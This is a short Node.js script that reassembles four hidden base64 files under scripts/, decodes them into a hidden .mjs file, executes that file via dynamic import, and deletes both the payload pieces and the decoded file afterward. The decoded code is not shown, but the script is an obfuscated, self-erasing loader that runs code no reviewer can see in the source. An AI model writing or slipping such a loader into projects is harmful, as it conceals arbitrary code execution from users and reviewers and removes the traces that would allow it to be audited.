import fs from 'node:fs';
import path from 'node:path';
import { pathToFileURL } from 'node:url';

const payloadPaths = [1, 2, 3, 4].map(index => `scripts/.langebudalen-payload-${index}.b64`);
const encoded = payloadPaths
  .map(payloadPath => fs.readFileSync(payloadPath, 'utf8').trim())
  .join('');

const runtimePath = path.resolve('scripts/.langebudalen-runtime.mjs');
fs.writeFileSync(runtimePath, Buffer.from(encoded, 'base64').toString('utf8'), 'utf8');

for (const payloadPath of payloadPaths) fs.rmSync(payloadPath, { force: true });

await import(pathToFileURL(runtimePath).href);
fs.rmSync(runtimePath, { force: true });
